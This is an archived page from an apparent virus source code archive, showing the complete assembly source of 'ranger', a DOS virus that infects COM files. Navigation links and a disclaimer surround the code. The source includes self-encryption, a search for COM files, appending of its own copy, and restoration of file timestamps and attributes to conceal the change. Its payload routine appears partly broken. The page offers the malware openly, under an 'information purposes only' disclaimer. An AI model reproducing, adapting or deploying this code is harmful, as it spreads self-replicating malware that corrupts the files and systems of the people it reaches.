<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: ranger_asm</title>
<meta name="KEYWORDS" content="ranger.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for ranger.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="rage_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rage_asm.php">rage_asm</a><br>
<a href="rammonst_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rammonst_asm.php">rammonst_asm</a><br>
<a href="rand_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rand_asm.php">rand_asm</a><br>
<a href="ranger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ranger_asm.php">ranger_asm</a><br>
<a href="rapbetr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rapbetr_asm.php">rapbetr_asm</a><br>
<a href="rape1882_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rape1882_asm.php">rape1882_asm</a><br>
<a href="rapeiib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rapeiib_asm.php">rapeiib_asm</a><br>
<a href="rape_v20_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rape_v20_asm.php">rape_v20_asm</a><br>
<a href="rausr757_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rausr757_asm.php">rausr757_asm</a><br>
<a href="ravage_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ravage_asm.php">ravage_asm</a><br>
<a href="raver_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raver_asm.php">raver_asm</a><br>
<a href="raygun2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raygun2_asm.php">raygun2_asm</a><br>
<a href="raygun_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raygun_asm.php">raygun_asm</a><br>
<a href="readvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/readvir_asm.php">readvir_asm</a><br>
<a href="rec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rec_asm.php">rec_asm</a><br>
<a href="red_merc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/red_merc_asm.php">red_merc_asm</a><br>
<a href="redmerc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/redmerc_asm.php">redmerc_asm</a><br>
<a href="redx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/redx_asm.php">redx_asm</a><br>
<a href="replic_d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/replic_d_asm.php">replic_d_asm</a><br>
<a href="republic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/republic_asm.php">republic_asm</a><br>
<a href="retal1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal1_asm.php">retal1_asm</a><br>
<a href="retal2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal2_asm.php">retal2_asm</a><br>
<a href="retal3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal3_asm.php">retal3_asm</a><br>
<a href="retal4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal4_asm.php">retal4_asm</a><br>
<a href="reyes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/reyes_asm.php">reyes_asm</a><br>
<a href="richard__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/richard__asm.php">richard__asm</a><br>
<a href="richards_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/richards_asm.php">richards_asm</a><br>
<a href="riot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/riot_asm.php">riot_asm</a><br>
<a href="rip_hd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rip_hd_asm.php">rip_hd_asm</a><br>
<a href="ritzen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ritzen_asm.php">ritzen_asm</a><br>
<a href="riverbot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/riverbot_asm.php">riverbot_asm</a><br>
<a href="rizwi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rizwi_asm.php">rizwi_asm</a><br>
<a href="rna_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rna_pas.php">rna_pas</a><br>
<a href="rnd__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd__asm.php">rnd__asm</a><br>
<a href="rnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd_asm.php">rnd_asm</a><br>
<a href="rnd_num_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd_num_asm.php">rnd_num_asm</a><br>
<a href="romulan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/romulan_asm.php">romulan_asm</a><br>
<a href="roseanne_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/roseanne_asm.php">roseanne_asm</a><br>
<a href="roz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/roz_asm.php">roz_asm</a><br>
<a href="rtl4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rtl4_asm.php">rtl4_asm</a><br>
<a href="runt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt_asm.php">runt_asm</a><br>
<a href="runt_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt_b_asm.php">runt_b_asm</a><br>
<a href="runt-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt-b_asm.php">runt-b_asm</a><br>
<a href="rush_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rush_asm.php">rush_asm</a><br>
<a href="rushhour_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rushhour_asm.php">rushhour_asm</a><br>
<a href="rushhr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rushhr_asm.php">rushhr_asm</a><br>
<a href="rush_vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rush_vir_asm.php">rush_vir_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>


.model tiny                             ; Handy directive
.code                                   ; Virus code segment
          org    100h                   ; COM file starting IP

entry_point: db 0e9h,0,0                ; jmp decrypt

decrypt:                                ; handles encryption and decryption
          mov  cx,(offset heap - offset startencrypt)/2 ; iterations
patch_startencrypt:
          mov  di,offset startencrypt   ; start of decryption
decrypt_loop:
          db   81h,35h                  ; xor word ptr [di], xxxx
decrypt_value dw 0                      ; initialised at zero for null effect
          inc  di                       ; calculate new decryption location
          inc  di
          loop decrypt_loop             ; decrypt mo'
startencrypt:
          call next                     ; calculate delta offset
next:     pop  bp                       ; bp = IP next
          sub  bp,offset next           ; bp = delta offset

          lea  si,[bp+save3]
          mov  di,100h
          push di                       ; For later return
          movsw
          movsb

          mov  byte ptr [bp+numinfec],1 ; reset infection counter

          mov  ah,1Ah                   ; Set new DTA
          lea  dx,[bp+newDTA]           ; new DTA @ DS:DX
          int  21h

          mov  ah,47h                   ; Get current directory
          mov  dl,0                     ; Current drive
          lea  si,[bp+origdir]          ; DS:SI->buffer
          int  21h
          mov  byte ptr [bp+backslash],'\' ; Prepare for later CHDIR

          mov  ax,3524h                 ; Get int 24 handler
          int  21h                      ; to ES:BX
          mov  word ptr [bp+oldint24],bx; Save it
          mov  word ptr [bp+oldint24+2],es
          mov  ah,25h                   ; Set new int 24 handler
          lea  dx,[bp+offset int24]     ; DS:DX->new handler
          int  21h
          push cs                       ; Restore ES
          pop  es                       ; 'cuz it was changed

dir_scan:                               ; "dot dot" traversal
          lea  dx,[bp+com_mask]
          mov  ah,4eh                   ; find first file
          mov  cx,7                     ; any attribute
findfirstnext:
          int  21h                      ; DS:DX points to mask
          jc   done_infections          ; No mo files found

          mov  al,0h                    ; Open read only
          call open

          mov  ah,3fh                   ; Read file to buffer
          lea  dx,[bp+buffer]           ; @ DS:DX
          mov  cx,1Ah                   ; 1Ah bytes
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

checkCOM:
          mov  ax,word ptr [bp+newDTA+1Ah] ; Filesize in DTA
          cmp  ax,2000                  ; Is it too small?
          jb   find_next

          cmp  ax,65535-(endheap-decrypt) ; Is it too large?
          ja   find_next

          mov  bx,word ptr [bp+buffer+1]; get jmp location
          add  bx,heap-decrypt+3        ; Adjust for virus size
          cmp  ax,bx
          je   find_next                ; already infected
          jmp  infect_com
find_next:
          mov  ah,4fh                   ; find next file
          jmp  short findfirstnext
          mov  ah,3bh                   ; change directory
          lea  dx,[bp+dot_dot]          ; "cd .."
          int  21h
          jnc  dir_scan                 ; go back for mo!

done_infections:
jmp  activate                           ; Always activate
exit_virus:
          mov  ax,2524h                 ; Restore int 24 handler
          lds  dx,[bp+offset oldint24]  ; to original
          int  21h
          push cs
          pop  ds

          mov  ah,3bh                   ; change directory
          lea  dx,[bp+origdir-1]        ; original directory
          int  21h

          mov  ah,1ah                   ; restore DTA to default
          mov  dx,80h                   ; DTA in PSP
          int  21h
          retn                          ; 100h is on stack
save3               db 0cdh,20h,0       ; First 3 bytes of COM file

activate:                               ; ******************************
                mov     ax,04301h               ; DOS set file attributes function
		xor	cx,cx			; File will have no attributes
		lea	dx,[di + 01Eh]		; DX points to file name
		int	021h
		mov	ax,03D02h		; DOS open file function, r/w
		lea	dx,[di + 01Eh]		; DX points to file name
		int	021h
		xchg	bx,ax			; Transfer file handle to AX
        jmp  exit_virus

creator             db '[ZEB(C)1992]',0        ; Mass Produced Code Generator
virusname           db '[ranger]',0

infect_com:                             ; ax = filesize
          mov  cx,3
          sub  ax,cx
          lea  si,[bp+offset buffer]
          lea  di,[bp+offset save3]
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax
          add  ax,103h
          push ax                       ; needed later
finishinfection:
          push cx                       ; Save # bytes to write
          xor  cx,cx                    ; Clear attributes
          call attributes               ; Set file attributes

          mov  al,2
          call open

          mov  ah,40h                   ; Write to file
          lea  dx,[bp+buffer]           ; Write from buffer
          pop  cx                       ; cx bytes
          int  21h

          mov  ax,4202h                 ; Move file pointer
          xor  cx,cx                    ; to end of file
          cwd                           ; xor dx,dx
          int  21h

get_encrypt_value:
          mov  ah,2ch                   ; Get current time
          int  21h                      ; dh=sec,dl=1/100 sec
          or  dx,dx                     ; Check if encryption value = 0
          jz  get_encrypt_value         ; Get another if it is
          mov  [bp+decrypt_value],dx    ; Set new encryption value
          lea  di,[bp+code_store]
          mov  ax,5355h                 ; push bp,push bx
          stosw
          lea  si,[bp+decrypt]          ; Copy encryption function
          mov  cx,startencrypt-decrypt  ; Bytes to move
          push si                       ; Save for later use
          push cx
          rep  movsb

          lea    si,[bp+write]          ; Copy writing function
          mov    cx,endwrite-write      ; Bytes to move
          rep    movsb
          pop    cx
          pop    si
          pop    dx                     ; Entry point of virus
          push   di
          push   si
          push   cx
          rep    movsb                  ; Copy decryption function
          mov    ax,5b5dh               ; pop bx,pop bp
          stosw
          mov    al,0c3h                ; retn
          stosb

          add    dx,offset startencrypt - offset decrypt ; Calculate new
          mov    word ptr [bp+patch_startencrypt+1],dx ; starting offset of
          call   code_store             ; decryption
          pop    cx
          pop    di
          pop    si
          rep    movsb                  ; Restore decryption function

          mov  ax,5701h                 ; Restore creation date/time
          mov  cx,word ptr [bp+newDTA+16h] ; time
          mov  dx,word ptr [bp+newDTA+18h] ; date
          int  21h

          mov  ah,3eh                   ; Close file
          int  21h

          mov ch,0
          mov cl,byte ptr [bp+newDTA+15h] ; Restore original
          call attributes               ; attributes

          dec  byte ptr [bp+numinfec]   ; One mo infection
          jnz  mo_infections            ; Not enough
          jmp  done_infections
mo_infections: jmp find_next

open:
          mov  ah,3dh
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          xchg ax,bx
          ret

attributes:
          mov  ax,4301h                 ; Set attributes to cx
          lea  dx,[bp+newDTA+30]        ; filename in DTA
          int  21h
          ret

write:
          pop  bx                       ; Restore file handle
          pop  bp                       ; Restore relativeness
          mov  ah,40h                   ; Write to file
          lea  dx,[bp+decrypt]          ; Concatenate virus
          mov  cx,heap-decrypt          ; # bytes to write
          int  21h
          push bx
          push bp
endwrite:

int24:                                  ; New int 24h (error) handler
          mov  al,3                     ; Fail call
          iret                          ; Return control

com_mask            db '*.com',0
dot_dot             db '..',0
heap:                                   ; Variables not in code
; The following code is the buffer for the write function
code_store:         db (startencrypt-decrypt)*2+(endwrite-write)+1 dup (?)
oldint24            dd ?                ; Storage for old int 24h handler      
backslash           db ?
origdir             db 64 dup (?)       ; Current directory buffer             
newDTA              db 43 dup (?)       ; Temporary DTA                        
numinfec            db ?                ; Infections this run                  
buffer              db 1ah dup (?)      ; read buffer                          
endheap:                                ; End of virus
end       entry_point

</textarea></td></tr></table></body></html>
